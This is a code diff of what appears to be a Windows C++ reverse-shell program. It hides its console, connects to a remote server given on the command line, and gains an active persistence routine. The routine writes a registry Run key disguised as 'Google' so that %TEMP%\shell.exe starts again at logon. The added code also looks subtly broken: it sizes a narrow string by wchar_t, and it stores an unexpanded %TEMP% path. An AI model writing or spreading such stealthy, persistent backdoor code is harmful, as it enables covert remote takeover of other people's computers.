@@ -2,20 +2,23 @@
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <wtypes.h>
+#include <string>
+#include <iostream>
 #pragma comment(lib, "Ws2_32.lib")
 #define DEFAULT_BUFLEN 1024
+
 
 void HideConsole()
 {
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 }
 
-//void Persistence() {
-//    std::wstring progPath = L"%TEMP%\\shell.exe";
-//    HKEY hkey = NULL;
-//    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
-//    LONG status = RegSetValueEx(hkey, L"Google", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
-// }
+void Persistence() {
+    std::string progPath = "%TEMP%\\shell.exe";
+    HKEY hkey = NULL;
+    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
+    LONG status = RegSetValueEx(hkey, "Google", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
+ }
 
 void RunShell(char* RemoteServer, int Port) {
     while (true) {
@@ -76,7 +79,7 @@ void RunShell(char* RemoteServer, int Port) {
 
 int main(int argc, char** argv) {
     HideConsole();
-    //Persistence();
+    Persistence();
     if (argc == 3) {
         int port = atoi(argv[2]);
         RunShell(argv[1], port);
